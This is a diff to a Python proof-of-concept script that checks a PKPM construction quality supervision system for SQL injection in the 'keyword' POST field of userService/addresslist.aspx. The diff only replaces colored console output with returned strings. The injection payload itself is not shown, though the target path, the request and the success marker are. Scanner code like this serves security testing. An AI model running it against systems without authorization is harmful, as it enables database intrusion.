@@ -9,8 +9,8 @@ description: userService/addresslist.aspx文件中POST keyword存在SQL注入。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class pkpmbs_addresslist_keyword_sqli_BaseVerify:
     def __init__(self, url):
@@ -29,12 +29,12 @@ class pkpmbs_addresslist_keyword_sqli_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"GAOJIMicrosoft" in req.text:
-                cprint("[+]存在pkpmbs建设工程质量监督系统注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在pkpmbs建设工程质量监督系统注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = pkpmbs_addresslist_keyword_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
